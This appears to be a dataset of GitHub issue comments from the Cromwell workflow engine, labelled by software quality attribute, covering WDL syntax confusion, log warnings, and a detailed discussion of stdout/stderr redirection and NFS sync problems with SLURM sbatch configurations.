https://github.com/broadinstitute/cromwell/issues/7085#issuecomment-1457413667:6266,Integrability,Message,Message,6266," by backend. Unsupported attributes will not be part of; > job executions.; > 2023-03-06 17:17:22,220 WARN - Local [UUID(7e3f9b56)]: Key/s [cpu, memory]; > is/are not supported by backend. Unsupported attributes will not be part of; > job executions.; > 2023-03-06 17:17:22,220 WARN - Local [UUID(7e3f9b56)]: Key/s [cpu, memory]; > is/are not supported by backend. Unsupported attributes will not be part of; > job executions.; > 2023-03-06 17:17:22,220 WARN - Local [UUID(7e3f9b56)]: Key/s [cpu, memory]; > is/are not supported by backend. Unsupported attributes will not be part of; > job executions.; > 2023-03-06 17:17:22,220 WARN - Local [UUID(7e3f9b56)]: Key/s [cpu, memory]; > is/are not supported by backend. Unsupported attributes will not be part of; > job executions.; > 2023-03-06 17:17:22,221 WARN - Local [UUID(7e3f9b56)]: Key/s [cpu, memory]; > is/are not supported by backend. Unsupported attributes will not be part of; > job executions.; > 2023-03-06 17:17:24,401 INFO -; > WorkflowExecutionActor-7e3f9b56-790b-481b-a8d9-f24e88883ed5; > [UUID(7e3f9b56)]: Starting pb_assembly_hifi.generate_config; > 2023-03-06 17:17:28,549 INFO -; > 13f1ea7a-4f35-41ea-9afa-f8fc84d083b0-SubWorkflowActor-SubWorkflow-prepare_input; > 👎1 [UUID(13f1ea7a)]: Starting prepare_input.dataset_filter; > 2023-03-06 17:17:30,919 WARN - BackgroundConfigAsyncJobExecutionActor; > [UUID(7e3f9b56)pb_assembly_hifi.generate_config:NA:1]: Unrecognized runtime; > attribute keys: cpu, memory; > 2023-03-06 17:17:30,919 WARN - BackgroundConfigAsyncJobExecutionActor; > [UUID(13f1ea7a)prepare_input.dataset_filter:NA:1]: Unrecognized runtime; > attribute keys: cpu, memory; >; > —; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/7085>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/ABCR6IDB7UG3LW47K526FULW22MK5ANCNFSM6AAAAAAVR4KY5U>; > .; > You are receiving this because you are subscribed to this thread.Message; > ID: ***@***.***>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7085#issuecomment-1457413667
https://github.com/broadinstitute/cromwell/issues/7093#issuecomment-1478250519:496,Availability,error,error,496,"It turns out the syntax change; https://github.com/openwdl/wdl/blob/main/versions/draft-2/SPEC.md#scatter--gather. I wonder if the documentation could be improved?. all the examples I found by googling things like 'wdl array iteration' found links to version 1 example. eventually, I stumbled on the idea of searching for wdl gather. Gather is not a standard term in computer science. Iterating over arrays does not require a scatter task. . I understand it is hard to write front ends with good error messages. I wonder if there is a way to write a something that checks for wdl version incompatibilities. I belive my womtool reported my wdl was valid. . Kind regards. Andy. Also there is a type in the code example https://github.com/openwdl/wdl/blob/main/versions/draft-2/SPEC.md#scatter--gather . ; ```; call sum {input: ints = inc.increment}; ```. should be; ```; call sum {input: ints = inc.incremented}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7093#issuecomment-1478250519
https://github.com/broadinstitute/cromwell/issues/7093#issuecomment-1478250519:502,Integrability,message,messages,502,"It turns out the syntax change; https://github.com/openwdl/wdl/blob/main/versions/draft-2/SPEC.md#scatter--gather. I wonder if the documentation could be improved?. all the examples I found by googling things like 'wdl array iteration' found links to version 1 example. eventually, I stumbled on the idea of searching for wdl gather. Gather is not a standard term in computer science. Iterating over arrays does not require a scatter task. . I understand it is hard to write front ends with good error messages. I wonder if there is a way to write a something that checks for wdl version incompatibilities. I belive my womtool reported my wdl was valid. . Kind regards. Andy. Also there is a type in the code example https://github.com/openwdl/wdl/blob/main/versions/draft-2/SPEC.md#scatter--gather . ; ```; call sum {input: ints = inc.increment}; ```. should be; ```; call sum {input: ints = inc.incremented}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7093#issuecomment-1478250519
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:584,Availability,error,errorOrDirectoryOutputs,584,"I had the same problem. The code that generates `stdout` and `stderr` is included in [StandardAsyncExecutionActor.scala](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala):; ```; // The `tee` trickery below is to be able to redirect to known filenames for CWL while also streaming; // stdout and stderr for PAPI to periodically upload to cloud storage.; // https://stackoverflow.com/questions/692000/how-do-i-write-stderr-to-a-file-while-using-tee-with-a-pipe; (errorOrDirectoryOutputs, errorOrGlobFiles).mapN((directoryOutputs, globFiles) =>; s""""""|#!$jobShell; |DOCKER_OUTPUT_DIR_LINK; |cd ${cwd.pathAsString}; |tmpDir=$temporaryDirectory; |$tmpDirPermissionsAdjustment; |export _JAVA_OPTIONS=-Djava.io.tmpdir=""$$tmpDir""; |export TMPDIR=""$$tmpDir""; |export HOME=""$home""; |(; |cd ${cwd.pathAsString}; |SCRIPT_PREAMBLE; |); |$out=""$${tmpDir}/out.$$$$"" $err=""$${tmpDir}/err.$$$$""; |mkfifo ""$$$out"" ""$$$err""; |trap 'rm ""$$$out"" ""$$$err""' EXIT; |touch $stdoutRedirection $stderrRedirection; |tee $stdoutRedirection < ""$$$out"" &; |tee $stderrRedirection < ""$$$err"" >&2 &; |(; |cd ${cwd.pathAsString}; |ENVIRONMENT_VARIABLES; |INSTANTIATED_COMMAND; |) $stdinRedirection > ""$$$out"" 2> ""$$$err""; |echo $$? > $rcTmpPath; |$emptyDirectoryFillCommand; |(; |cd ${cwd.pathAsString}; |SCRIPT_EPILOGUE; |${globScripts(globFiles)}; |${directoryScripts(directoryOutputs)}; |); |mv $rcTmpPath $rcPath; |"""""".stripMargin; .replace(""SCRIPT_PREAMBLE"", scriptPreamble); .replace(""ENVIRONMENT_VARIABLES"", environmentVariables); .replace(""INSTANTIATED_COMMAND"", commandString); .replace(""SCRIPT_EPILOGUE"", scriptEpilogue); .replace(""DOCKER_OUTPUT_DIR_LINK"", dockerOutputDir)); }; ```; With `SCRIPT_EPILOGUE` set to default to `sync` and modifiable with the `script-epilogue` variable in the configuration (this is not explained in the Cromwell documentation but it is explained [here](https://github.com/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:609,Availability,error,errorOrGlobFiles,609,"I had the same problem. The code that generates `stdout` and `stderr` is included in [StandardAsyncExecutionActor.scala](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala):; ```; // The `tee` trickery below is to be able to redirect to known filenames for CWL while also streaming; // stdout and stderr for PAPI to periodically upload to cloud storage.; // https://stackoverflow.com/questions/692000/how-do-i-write-stderr-to-a-file-while-using-tee-with-a-pipe; (errorOrDirectoryOutputs, errorOrGlobFiles).mapN((directoryOutputs, globFiles) =>; s""""""|#!$jobShell; |DOCKER_OUTPUT_DIR_LINK; |cd ${cwd.pathAsString}; |tmpDir=$temporaryDirectory; |$tmpDirPermissionsAdjustment; |export _JAVA_OPTIONS=-Djava.io.tmpdir=""$$tmpDir""; |export TMPDIR=""$$tmpDir""; |export HOME=""$home""; |(; |cd ${cwd.pathAsString}; |SCRIPT_PREAMBLE; |); |$out=""$${tmpDir}/out.$$$$"" $err=""$${tmpDir}/err.$$$$""; |mkfifo ""$$$out"" ""$$$err""; |trap 'rm ""$$$out"" ""$$$err""' EXIT; |touch $stdoutRedirection $stderrRedirection; |tee $stdoutRedirection < ""$$$out"" &; |tee $stderrRedirection < ""$$$err"" >&2 &; |(; |cd ${cwd.pathAsString}; |ENVIRONMENT_VARIABLES; |INSTANTIATED_COMMAND; |) $stdinRedirection > ""$$$out"" 2> ""$$$err""; |echo $$? > $rcTmpPath; |$emptyDirectoryFillCommand; |(; |cd ${cwd.pathAsString}; |SCRIPT_EPILOGUE; |${globScripts(globFiles)}; |${directoryScripts(directoryOutputs)}; |); |mv $rcTmpPath $rcPath; |"""""".stripMargin; .replace(""SCRIPT_PREAMBLE"", scriptPreamble); .replace(""ENVIRONMENT_VARIABLES"", environmentVariables); .replace(""INSTANTIATED_COMMAND"", commandString); .replace(""SCRIPT_EPILOGUE"", scriptEpilogue); .replace(""DOCKER_OUTPUT_DIR_LINK"", dockerOutputDir)); }; ```; With `SCRIPT_EPILOGUE` set to default to `sync` and modifiable with the `script-epilogue` variable in the configuration (this is not explained in the Cromwell documentation but it is explained [here](https://github.com/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:1311,Availability,echo,echo,1311,"la):; ```; // The `tee` trickery below is to be able to redirect to known filenames for CWL while also streaming; // stdout and stderr for PAPI to periodically upload to cloud storage.; // https://stackoverflow.com/questions/692000/how-do-i-write-stderr-to-a-file-while-using-tee-with-a-pipe; (errorOrDirectoryOutputs, errorOrGlobFiles).mapN((directoryOutputs, globFiles) =>; s""""""|#!$jobShell; |DOCKER_OUTPUT_DIR_LINK; |cd ${cwd.pathAsString}; |tmpDir=$temporaryDirectory; |$tmpDirPermissionsAdjustment; |export _JAVA_OPTIONS=-Djava.io.tmpdir=""$$tmpDir""; |export TMPDIR=""$$tmpDir""; |export HOME=""$home""; |(; |cd ${cwd.pathAsString}; |SCRIPT_PREAMBLE; |); |$out=""$${tmpDir}/out.$$$$"" $err=""$${tmpDir}/err.$$$$""; |mkfifo ""$$$out"" ""$$$err""; |trap 'rm ""$$$out"" ""$$$err""' EXIT; |touch $stdoutRedirection $stderrRedirection; |tee $stdoutRedirection < ""$$$out"" &; |tee $stderrRedirection < ""$$$err"" >&2 &; |(; |cd ${cwd.pathAsString}; |ENVIRONMENT_VARIABLES; |INSTANTIATED_COMMAND; |) $stdinRedirection > ""$$$out"" 2> ""$$$err""; |echo $$? > $rcTmpPath; |$emptyDirectoryFillCommand; |(; |cd ${cwd.pathAsString}; |SCRIPT_EPILOGUE; |${globScripts(globFiles)}; |${directoryScripts(directoryOutputs)}; |); |mv $rcTmpPath $rcPath; |"""""".stripMargin; .replace(""SCRIPT_PREAMBLE"", scriptPreamble); .replace(""ENVIRONMENT_VARIABLES"", environmentVariables); .replace(""INSTANTIATED_COMMAND"", commandString); .replace(""SCRIPT_EPILOGUE"", scriptEpilogue); .replace(""DOCKER_OUTPUT_DIR_LINK"", dockerOutputDir)); }; ```; With `SCRIPT_EPILOGUE` set to default to `sync` and modifiable with the `script-epilogue` variable in the configuration (this is not explained in the Cromwell documentation but it is explained [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/LocalExample.conf)). Maybe the problem could have been solved by also replacing `$stdoutRedirection` and `$stderrRedirection` with something like `$stdoutRedirectionTmp` and `$stderrRedirection",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:5748,Availability,echo,echo,5748,"which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; """"""; ```; But both options are way less than ideal and the choice of `60` might not be sufficient for all NFS configurations. If anybody wants to try to trigger this issue on an NFS shared filesystem setup, the following WDL should do the trick:; ```; version 1.0. workflow main {; scatter (idx in range(256)) {; call main {; input:; i = idx; }; }; output { Array[Int] n = main.n }; }. task main {; input {; Int i; }. command <<<; set -euo pipefail; echo ~{i*i}; >>>. output {; Int n = read_int(stdout()); }. runtime {; docker: ""debian:stable-slim""; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:1888,Deployability,configurat,configuration,1888,"=""$$tmpDir""; |export HOME=""$home""; |(; |cd ${cwd.pathAsString}; |SCRIPT_PREAMBLE; |); |$out=""$${tmpDir}/out.$$$$"" $err=""$${tmpDir}/err.$$$$""; |mkfifo ""$$$out"" ""$$$err""; |trap 'rm ""$$$out"" ""$$$err""' EXIT; |touch $stdoutRedirection $stderrRedirection; |tee $stdoutRedirection < ""$$$out"" &; |tee $stderrRedirection < ""$$$err"" >&2 &; |(; |cd ${cwd.pathAsString}; |ENVIRONMENT_VARIABLES; |INSTANTIATED_COMMAND; |) $stdinRedirection > ""$$$out"" 2> ""$$$err""; |echo $$? > $rcTmpPath; |$emptyDirectoryFillCommand; |(; |cd ${cwd.pathAsString}; |SCRIPT_EPILOGUE; |${globScripts(globFiles)}; |${directoryScripts(directoryOutputs)}; |); |mv $rcTmpPath $rcPath; |"""""".stripMargin; .replace(""SCRIPT_PREAMBLE"", scriptPreamble); .replace(""ENVIRONMENT_VARIABLES"", environmentVariables); .replace(""INSTANTIATED_COMMAND"", commandString); .replace(""SCRIPT_EPILOGUE"", scriptEpilogue); .replace(""DOCKER_OUTPUT_DIR_LINK"", dockerOutputDir)); }; ```; With `SCRIPT_EPILOGUE` set to default to `sync` and modifiable with the `script-epilogue` variable in the configuration (this is not explained in the Cromwell documentation but it is explained [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/LocalExample.conf)). Maybe the problem could have been solved by also replacing `$stdoutRedirection` and `$stderrRedirection` with something like `$stdoutRedirectionTmp` and `$stderrRedirectionTmp` and then replace:; ```; mv $rcTmpPath $rcPath; ```; with:; ```; mv $stdoutRedirectionTmp $stdoutRedirection; mv $stderrRedirectionTmp $stderrRedirection; mv $rcTmpPath $rcPath; ```; This way `stdout` and `stderr` would have been created in the NFS filesystem at the same time as the `rc` file and would increase the likelihood that they would all have been synced at the same time. However, this would not give the intended behavior when running in Google Cloud. Another problem that I have noticed is that there are multiple places in the Cromwell documentation t",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:2912,Deployability,configurat,configurations,2912,"t-epilogue` variable in the configuration (this is not explained in the Cromwell documentation but it is explained [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/LocalExample.conf)). Maybe the problem could have been solved by also replacing `$stdoutRedirection` and `$stderrRedirection` with something like `$stdoutRedirectionTmp` and `$stderrRedirectionTmp` and then replace:; ```; mv $rcTmpPath $rcPath; ```; with:; ```; mv $stdoutRedirectionTmp $stdoutRedirection; mv $stderrRedirectionTmp $stderrRedirection; mv $rcTmpPath $rcPath; ```; This way `stdout` and `stderr` would have been created in the NFS filesystem at the same time as the `rc` file and would increase the likelihood that they would all have been synced at the same time. However, this would not give the intended behavior when running in Google Cloud. Another problem that I have noticed is that there are multiple places in the Cromwell documentation that advise, when running Cromwell with SLURM, to use configurations such as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#configuration)):; ```; sbatch \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr \; ```; or as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#e-now-add-the-following-text-after-line-479-ie-after-the-line-reading-default-slurm-ensure-that-the-lines-that-show-line-breaks-in-this-document-are-in-fact-single-lines-in-referenceconf), or [here](https://cromwell.readthedocs.io/en/stable/backends/SLURM/), or [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, whic",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:3011,Deployability,configurat,configuration,3011,"8972337ce9/cromwell.example.backends/LocalExample.conf)). Maybe the problem could have been solved by also replacing `$stdoutRedirection` and `$stderrRedirection` with something like `$stdoutRedirectionTmp` and `$stderrRedirectionTmp` and then replace:; ```; mv $rcTmpPath $rcPath; ```; with:; ```; mv $stdoutRedirectionTmp $stdoutRedirection; mv $stderrRedirectionTmp $stderrRedirection; mv $rcTmpPath $rcPath; ```; This way `stdout` and `stderr` would have been created in the NFS filesystem at the same time as the `rc` file and would increase the likelihood that they would all have been synced at the same time. However, this would not give the intended behavior when running in Google Cloud. Another problem that I have noticed is that there are multiple places in the Cromwell documentation that advise, when running Cromwell with SLURM, to use configurations such as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#configuration)):; ```; sbatch \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr \; ```; or as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#e-now-add-the-following-text-after-line-479-ie-after-the-line-reading-default-slurm-ensure-that-the-lines-that-show-line-breaks-in-this-document-are-in-fact-single-lines-in-referenceconf), or [here](https://cromwell.readthedocs.io/en/stable/backends/SLURM/), or [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:4251,Deployability,configurat,configuration,4251,"-479-ie-after-the-line-reading-default-slurm-ensure-that-the-lines-that-show-line-breaks-in-this-document-are-in-fact-single-lines-in-referenceconf), or [here](https://cromwell.readthedocs.io/en/stable/backends/SLURM/), or [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cw",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:4760,Deployability,configurat,configuration,4760," \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; """"""; ```; But both options are way less than ideal and the choice of `60` might not be sufficient for all NFS configurations. If anybody wants to try to trigger this issue on an NFS shared filesystem setup, the following WDL should do the trick:; ```; version 1.0. workflow main {; scatter (idx in range(256)) {; call main {; input:; i = idx; }; }; output { Array[Int] n = main.n }; }. task main {; input {; Int i; }. command <<<; set -euo pipefail; echo ~",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:5408,Deployability,configurat,configurations,5408,"which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; """"""; ```; But both options are way less than ideal and the choice of `60` might not be sufficient for all NFS configurations. If anybody wants to try to trigger this issue on an NFS shared filesystem setup, the following WDL should do the trick:; ```; version 1.0. workflow main {; scatter (idx in range(256)) {; call main {; input:; i = idx; }; }; output { Array[Int] n = main.n }; }. task main {; input {; Int i; }. command <<<; set -euo pipefail; echo ~{i*i}; >>>. output {; Int n = read_int(stdout()); }. runtime {; docker: ""debian:stable-slim""; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:4476,Integrability,wrap,wrap,4476,"orials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; """"""; ```; But both options are way less than ideal and the choice of `60` might not be sufficient for all NFS configurations. If anybody wants to try to trigger this issue on an NFS shared filesystem setup, the following ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:5183,Integrability,wrap,wrap,5183,"which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} 